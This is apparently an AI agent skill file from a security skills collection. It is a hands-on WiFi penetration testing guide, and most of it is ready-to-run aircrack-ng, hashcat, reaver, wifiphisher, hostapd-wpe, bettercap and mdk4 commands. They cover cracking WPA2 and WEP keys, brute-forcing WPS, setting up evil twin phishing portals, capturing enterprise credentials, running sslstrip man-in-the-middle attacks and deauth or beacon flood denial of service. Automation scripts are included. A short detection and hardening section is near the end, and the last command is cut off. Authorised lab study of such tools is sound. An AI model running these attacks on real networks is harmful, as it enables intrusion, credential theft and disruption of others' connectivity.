---
name: wireless-security-wifi-penetration-testing
description: Hands-on wireless security and WiFi penetration testing guide covering 802.11, WEP/WPA/WPA2/WPA3 attacks, aircrack-ng suite, and wireless assessment techniques
triggers:
  - how do I crack WPA2 handshakes
  - test wireless network security with aircrack-ng
  - capture WiFi handshakes for penetration testing
  - set up monitor mode on wireless adapter
  - perform evil twin attack on WiFi
  - crack WEP encryption with aircrack
  - assess enterprise WPA with RADIUS
  - detect rogue access points
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This skill provides expertise in wireless security assessment and WiFi penetration testing using the aircrack-ng suite and related tools. It covers 802.11 protocol fundamentals, WEP/WPA/WPA2/WPA3 attacks, rogue access points, wireless MITM, and enterprise wireless assessment.

## Overview

This is a comprehensive study curriculum covering:
- 802.11 wireless fundamentals and frame analysis
- Monitor mode and packet injection setup
- Wireless reconnaissance and traffic analysis
- WEP cracking (multiple attack vectors)
- WPA/WPA2 handshake capture and cracking
- PMKID attacks (clientless WPA2 cracking)
- Rogue access points and evil twin attacks
- Wireless Man-in-the-Middle (MITM) attacks
- WPA3 and advanced TKIP attacks
- Enterprise WPA (EAP/RADIUS) assessment
- Wireless hardening and detection

## Prerequisites

**Required Hardware:**
- Injection-capable wireless adapter (Atheros AR9271 or Ralink RT3070/RT5372 chipset)
- Test access point (router you own)
- Client device(s) for testing

**Software Platform:**
- Kali Linux (bare-metal or VM with USB passthrough)
- aircrack-ng suite (pre-installed on Kali)
- hashcat, hcxdumptool, kismet, wireshark

**Legal Notice:**
All techniques are for **authorized testing only**. Wireless attacks against networks without explicit written permission are illegal. Practice only in isolated lab environments you own.

## Installation & Setup

### Verify Wireless Adapter Compatibility

```bash
# Check if adapter is detected
iwconfig

# Check chipset information
lsusb
ethtool -i wlan0

# Install aircrack-ng suite (if not present)
sudo apt update
sudo apt install -y aircrack-ng
```

### Enable Monitor Mode

```bash
# Check for interfering processes
sudo airmon-ng check

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode on wlan0
sudo airmon-ng start wlan0

# Verify monitor interface created (wlan0mon)
iwconfig

# Alternative manual method
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### Test Packet Injection

```bash
# Test injection capability
sudo aireplay-ng --test wlan0mon

# Expected output should show "Injection is working!"
# and list of nearby APs with packet counts
```

### Set Regulatory Domain

```bash
# Set regulatory domain (use your country code)
sudo iw reg set US

# Verify
iw reg get

# Set transmission power (if needed)
sudo iw dev wlan0mon set txpower fixed 2000  # 20dBm
```

## Core Aircrack-ng Suite Commands

### airodump-ng - Wireless Packet Capture

```bash
# Basic wireless reconnaissance (all channels)
sudo airodump-ng wlan0mon

# Capture on specific channel
sudo airodump-ng -c 6 wlan0mon

# Target specific BSSID and write to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Capture only handshakes (filter beacon frames)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa-handshake --output-format pcap wlan0mon

# Show only WEP networks
sudo airodump-ng --encrypt wep wlan0mon

# Monitor specific MAC address (client tracking)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -d 11:22:33:44:55:66 wlan0mon
```

**airodump-ng Output Columns:**
- BSSID: AP MAC address
- PWR: Signal strength (closer to 0 = stronger)
- Beacons: Beacon frames sent by AP
- #Data: Number of data packets captured
- CH: Channel
- ENC: Encryption type (OPN, WEP, WPA, WPA2, WPA3)
- CIPHER: Cipher used (TKIP, CCMP)
- AUTH: Authentication (PSK, MGT for 802.1X)
- ESSID: Network name

### aireplay-ng - Packet Injection & Attacks

```bash
# Deauthentication attack (disconnect client from AP)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -a = AP BSSID, -c = Client MAC, 10 = number of deauth packets

# Broadcast deauth (disconnect all clients)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Fake authentication (for WEP cracking)
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# ARP replay attack (WEP - generate IVs)
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Interactive packet replay (WEP)
sudo aireplay-ng --interactive -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# ChopChop attack (WEP packet decryption)
sudo aireplay-ng --chopchop -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Fragmentation attack (WEP - obtain PRGA keystream)
sudo aireplay-ng --fragment -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Caffe Latte attack (WEP - client-side)
sudo aireplay-ng --caffe-latte -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
```

### aircrack-ng - Key Cracking

```bash
# Crack WEP with captured IVs
sudo aircrack-ng capture-01.cap

# Crack WEP with PTW attack (faster, requires ARP packets)
sudo aircrack-ng -a 1 -e "TargetSSID" capture-01.cap

# Crack WPA/WPA2 with wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Crack WPA with specific ESSID
sudo aircrack-ng -w wordlist.txt -e "TargetSSID" wpa-handshake-01.cap

# Use multiple CPU cores
sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap -p 4
```

### airbase-ng - Rogue Access Point

```bash
# Create fake AP (evil twin)
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Evil twin with specific BSSID
sudo airbase-ng -e "TargetSSID" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Create WPA2 evil twin (requires hostapd for proper WPA)
sudo airbase-ng -e "TargetSSID" -c 6 -Z 4 wlan0mon
# -Z 4 = WPA2 CCMP

# Capture handshakes from evil twin
sudo airbase-ng -e "TargetSSID" -c 6 -W 1 wlan0mon
```

## WPA/WPA2 Handshake Capture & Cracking

### Complete WPA2 Attack Workflow

```bash
# Terminal 1: Start capture on target AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa-capture wlan0mon

# Terminal 2: Deauth client to force handshake
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Watch Terminal 1 for "WPA handshake: AA:BB:CC:DD:EE:FF" message

# Stop capture (Ctrl+C in Terminal 1)

# Crack with aircrack-ng
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa-capture-01.cap

# Alternative: Convert to hashcat format
sudo aircrack-ng -J hashcat-capture wpa-capture-01.cap

# Crack with hashcat (GPU-accelerated)
hashcat -m 22000 hashcat-capture.hc22000 /usr/share/wordlists/rockyou.txt
```

### PMKID Attack (Clientless WPA2 Cracking)

```bash
# Install hcxdumptool and hcxtools
sudo apt install -y hcxdumptool hcxtools

# Capture PMKID (no client needed)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack PMKID with hashcat
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# Show cracked passwords
hashcat -m 22000 pmkid.hc22000 --show
```

## WEP Cracking Techniques

### Standard WEP Cracking (ARP Replay)

```bash
# Terminal 1: Capture packets
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep-capture wlan0mon

# Terminal 2: Fake authentication
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Terminal 3: ARP replay (wait for ARP packet, then replay)
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Wait for 20,000+ IVs (watch #Data column in Terminal 1)

# Terminal 4: Crack WEP key
sudo aircrack-ng wep-capture-01.cap
```

### ChopChop Attack (Interactive WEP Decryption)

```bash
# Capture packets
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w chopchop wlan0mon

# Perform ChopChop attack
sudo aireplay-ng --chopchop -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# This creates .xor file with PRGA keystream

# Create ARP packet from keystream
sudo packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 -k 192.168.1.1 -l 192.168.1.100 -y replay_dec-*.xor -w arp-packet

# Replay forged packet
sudo aireplay-ng --interactive -r arp-packet wlan0mon

# Crack with collected IVs
sudo aircrack-ng chopchop-01.cap
```

## Evil Twin & Rogue AP Attacks

### Basic Evil Twin with hostapd

```bash
# Create hostapd configuration
cat > evil-twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=TargetSSID
channel=6
hw_mode=g
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# Start evil twin AP
sudo hostapd evil-twin.conf

# In another terminal, configure DHCP
sudo ip addr add 192.168.1.1/24 dev wlan0
sudo ip link set wlan0 up

# Start dnsmasq for DHCP
sudo dnsmasq -i wlan0 --dhcp-range=192.168.1.10,192.168.1.100,12h
```

### Evil Twin with WPA2 and Credential Capture

```bash
# Create WPA2 evil twin config
cat > evil-wpa2.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=TargetSSID
channel=6
hw_mode=g
wpa=2
wpa_passphrase=FakePassword123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start AP
sudo hostapd evil-wpa2.conf

# Monitor authentication attempts and capture handshakes
sudo airodump-ng -c 6 --bssid <YOUR_EVIL_AP_MAC> -w evil-capture wlan0mon
```

### Using wifiphisher (Automated Evil Twin)

```bash
# Install wifiphisher
sudo apt install -y wifiphisher

# Run automated evil twin with firmware upgrade portal
sudo wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade

# Custom phishing portal
sudo wifiphisher -aI wlan0 -eI "TargetSSID" -p oauth-login
```

## Wireless Reconnaissance

### Detailed Network Discovery

```bash
# Discover all networks (verbose)
sudo airodump-ng --manufacturer --wps --uptime wlan0mon

# Export to CSV for analysis
sudo airodump-ng -w survey --output-format csv wlan0mon

# Discover hidden SSIDs
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Active probing for hidden SSID (send probe requests)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# Monitor airodump-ng for ESSID to appear after deauth
```

### Kismet - Advanced Wireless IDS

```bash
# Install Kismet
sudo apt install -y kismet

# Start Kismet server
sudo kismet -c wlan0mon

# Access web interface
# Open browser: http://localhost:2501

# Export detected networks
kismet_server -t "Target SSID" --export kismet-export.xml
```

### Client Discovery & Tracking

```bash
# List clients connected to specific AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Track specific client across APs
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -d 11:22:33:44:55:66 wlan0mon

# Capture probe requests (reveals client SSIDs)
sudo tcpdump -i wlan0mon -e -s 256 type mgt subtype probe-req
```

## WPS Attacks

### Reaver - WPS PIN Brute Force

```bash
# Install reaver
sudo apt install -y reaver

# Scan for WPS-enabled APs
sudo wash -i wlan0mon

# Perform reaver attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Reaver with pixie dust attack (faster)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K -vv

# Resume interrupted session
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -s /tmp/reaver/session -vv
```

### Bully - Alternative WPS Cracker

```bash
# Install bully
sudo apt install -y bully

# Standard WPS attack
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Pixie dust attack
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -d wlan0mon
```

## Traffic Analysis & MITM

### Capture and Decrypt WPA Traffic

```bash
# Capture with known PSK
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w decrypt-capture wlan0mon

# Decrypt in Wireshark:
# Edit > Preferences > Protocols > IEEE 802.11
# Add decryption key: wpa-psk or wpa-pwd
# Format: "password:SSID" or raw hex key

# Alternative: airdecap-ng
sudo airdecap-ng -e "TargetSSID" -p "password" decrypt-capture-01.cap
# Creates decrypted file: decrypt-capture-01-dec.cap
```

### Wireless MITM with bettercap

```bash
# Install bettercap
sudo apt install -y bettercap

# Start bettercap on wireless interface
sudo bettercap -iface wlan0

# In bettercap console:
# Enable wireless module
wifi.recon on

# Select target AP
wifi.recon AA:BB:CC:DD:EE:FF

# Deauth clients
wifi.deauth AA:BB:CC:DD:EE:FF

# Create evil twin
set wifi.ap.ssid "TargetSSID"
set wifi.ap.bssid AA:BB:CC:DD:EE:FF
set wifi.ap.encryption false
wifi.ap

# Enable HTTP/HTTPS proxy
set http.proxy.sslstrip true
http.proxy on
net.sniff on
```

## Enterprise WPA (802.1X / RADIUS) Assessment

### Setup Test RADIUS Server with FreeRADIUS

```bash
# Install FreeRADIUS
sudo apt install -y freeradius freeradius-utils

# Configure test user
sudo nano /etc/freeradius/3.0/users
# Add: testuser Cleartext-Password := "testpass"

# Configure client (AP)
sudo nano /etc/freeradius/3.0/clients.conf
# Add:
# client testap {
#     ipaddr = 192.168.1.100
#     secret = testing123
# }

# Start FreeRADIUS in debug mode
sudo freeradius -X

# Test authentication
radtest testuser testpass 127.0.0.1 0 testing123
```

### Configure hostapd for Enterprise WPA

```bash
# Create enterprise config
cat > enterprise-wpa.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=EnterpriseNet
channel=6
hw_mode=g

# WPA2 Enterprise
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# RADIUS server config
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123

# EAP configuration
eap_server=0
eapol_key_index_workaround=0
EOF

# Start enterprise AP
sudo hostapd enterprise-wpa.conf
```

### EAP Attack - hostapd-wpe (Credential Capture)

```bash
# Install hostapd-wpe (Wireless Pwnage Edition)
sudo apt install -y hostapd-wpe

# Configure rogue RADIUS
sudo nano /etc/hostapd-wpe/hostapd-wpe.conf
# Update interface, SSID, channel

# Start rogue enterprise AP
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials saved to:
# /var/log/hostapd-wpe/hostapd-wpe.log

# Crack captured MSCHAP challenges with asleap
asleap -C <challenge> -R <response> -W wordlist.txt
```

## Packet Analysis with Wireshark

### Filter Expressions for Wireless Analysis

```bash
# Open capture in Wireshark
wireshark wpa-capture-01.cap

# Useful display filters:
wlan.fc.type == 0               # Management frames
wlan.fc.type == 1               # Control frames
wlan.fc.type == 2               # Data frames
wlan.fc.type_subtype == 0x08    # Beacon frames
wlan.fc.type_subtype == 0x04    # Probe requests
wlan.fc.type_subtype == 0x05    # Probe responses
wlan.fc.type_subtype == 0x0c    # Deauthentication
eapol                           # EAPOL (handshake) frames
wlan.bssid == aa:bb:cc:dd:ee:ff # Specific AP
wlan.sa == 11:22:33:44:55:66    # Specific source MAC

# Detect deauth attacks
wlan.fc.type_subtype == 0x0c && wlan.fixed.reason_code == 0x07

# Export objects (files transferred)
File > Export Objects > HTTP
```

### Verify WPA Handshake Capture

```bash
# Use pyrit to verify handshake
sudo apt install -y pyrit

# Analyze capture
pyrit -r wpa-capture-01.cap analyze

# List captured handshakes
pyrit -r wpa-capture-01.cap list_cores

# Alternative: tshark command line
tshark -r wpa-capture-01.cap -Y eapol -V | grep -i handshake
```

## Wireless Denial of Service

### Deauthentication Flood

```bash
# Continuous deauth (DoS)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth all clients on channel
sudo mdk4 wlan0mon d -c 6

# Targeted deauth with timeout
timeout 60s sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Beacon Flood (SSID Spam)

```bash
# Install mdk4
sudo apt install -y mdk4

# Beacon flood on channel 6
sudo mdk4 wlan0mon b -c 6

# Beacon flood with custom SSIDs from file
echo -e "FreeWiFi\nGuest\nPublic" > ssid-list.txt
sudo mdk4 wlan0mon b -c 6 -f ssid-list.txt

# Authentication DoS
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF -i 11:22:33:44:55:66
```

## Wireless Hardening & Detection

### Detect Rogue Access Points

```bash
# Monitor for unauthorized APs
sudo airodump-ng --manufacturer wlan0mon

# Compare against known MAC OUI database
# Look for duplicate SSIDs with different BSSIDs

# Automated detection with Kismet
sudo kismet -c wlan0mon
# Configure alerts for new APs in Kismet web UI
```

### Detect Deauthentication Attacks

```bash
# Monitor deauth frames
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Count deauth frames with tshark
sudo tshark -i wlan0mon -f "type mgt subtype deauth" -T fields -e frame.number

# Alert on excessive deauth (>10/sec indicates attack)
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0c" -T fields -e wlan.bssid | sort | uniq -c
```

### Enable 802.11w (Management Frame Protection)

```bash
# Configure in hostapd for WPA2
cat >> hostapd.conf << 'EOF'
# Enable PMF (Protected Management Frames)
ieee80211w=2  # 0=disabled, 1=optional, 2=required
EOF

# On client side (wpa_supplicant)
cat >> wpa_supplicant.conf << 'EOF'
network={
    ssid="ProtectedSSID"
    psk="password"
    ieee80211w=2
}
EOF
```

## Cracking Optimization

### Using Hashcat with GPU

```bash
# Convert aircrack capture to hashcat format
sudo aircrack-ng -J hashcat-out capture-01.cap

# Or use hcxpcapngtool for modern format
hcxpcapngtool -o output.hc22000 capture-01.cap

# WPA/WPA2 cracking (hash mode 22000)
hashcat -m 22000 output.hc22000 /usr/share/wordlists/rockyou.txt

# Show cracking status
hashcat -m 22000 output.hc22000 --status

# Resume session
hashcat -m 22000 output.hc22000 wordlist.txt --session=wpa-crack --restore

# Benchmark GPU performance
hashcat -b -m 22000

# Use mask attack (brute force patterns)
hashcat -m 22000 output.hc22000 -a 3 ?d?d?d?d?d?d?d?d
# ?d = digit, ?l = lowercase, ?u = uppercase, ?s = special
```

### Precomputed Tables with Cowpatty

```bash
# Install cowpatty
sudo apt install -y cowpatty

# Generate precomputed tables (PMK rainbow table)
genpmk -f wordlist.txt -d pmk-table.db -s "TargetSSID"

# Crack with precomputed table (instant if password in table)
cowpatty -d pmk-table.db -r capture-01.cap -s "TargetSSID"

# Standard cowpatty cracking
cowpatty -f wordlist.txt -r capture-01.cap -s "TargetSSID"
```

## Automation & Scripting

### Automated Handshake Capture Script

```bash
#!/bin/bash
# automated-handshake.sh

TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL="6"
OUTPUT_PREFIX="handshake"

# Start capture in background
sudo airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$OUTPUT_PREFIX" wlan0mon &
CAPTURE_PID=$!

# Wait 10 seconds for clients to appear
sleep 10

# Send 20 deauth packets
sudo aireplay-ng --deauth 20 -a "$TARGET_BSSID" wlan0mon

# Wait 30 seconds for handshake
sleep 30

# Stop capture
sudo kill $CAPTURE_PID

# Check if handshake captured
pyrit -r "${OUTPUT_PREFIX}-01.cap" analyze | grep -q "good, clean"
if [ $? -eq 0 ]; then
    echo "[+] Handshake captured successfully!"
else
    echo "[-] No handshake captured. Try again."
fi
```

### Channel Hopping for Reconnaissance

```bash
#!/bin/bash
# channel-hop.sh

INTERFACE="wlan0mon"

while true; do
    for channel in {1..14}; do
        sudo iwconfig "$INTERFACE" channel "$channel"
        echo "Channel: $channel"
        sleep 2
    done
done
```

## Troubleshooting

### Adapter Not Entering Monitor Mode

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Manually set monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set monitor none
sudo ip link set wlan0 up

# Check kernel driver
lsmod | grep -E "ath9k|rt2800usb|rt73usb"

# Reinstall firmware (for Atheros)
sudo apt install --reinstall firmware-atheros
```

### Injection Not Working

```bash
# Test injection capability
sudo aireplay-ng --test wlan0mon

# Check if adapter supports injection
iw list | grep -A 10 "Supported interface modes"

# Verify regulatory domain allows transmission
iw reg get

# Set txpower explicitly
sudo iw dev wlan0mon set txpower fixed 2000
```

### No Handshake Captured

```bash
# Verify target AP has clients
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
# Check "STATION" section for connected clients

# Try multiple deauth rounds
for i in {1..5}; do
    sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
    sleep 5
done

# Ensure capture started BEFORE deauth
# Handshake is only captured during (re)connection

# Use both directed and broadcast deauth
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### WEP Cracking Fails

```bash
# Ensure enough IVs captured (minimum 20,000)
aircrack-ng capture-01.cap
# Check "IV" count in output

# Try PTW attack (requires ARP packets)
aircrack-ng -a 1 capture-01.cap

# Use KoreK attack if PTW fails
aircrack-ng -K capture-01.cap

# Verify fake authentication succeeded
# Check airodump-ng for "AUTH" in top-right of target AP row
```

### Cracking Takes Too Long

```bash
# Use GPU acceleration with hashcat instead of aircrack-ng
hcxpcapngtool -o hash.hc22000 capture.cap
hashcat -m 22000 -w 3 hash.hc22000 wordlist.txt

# Generate custom wordlist with crunch
crunch 8 12 -t @@@@@@@@ -o custom-wordlist.txt

# Use rules to expand wordlist
hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Create target-specific wordlist (location, company name, dates)
cewl -d 2 -m 8 https://target-company.com -w
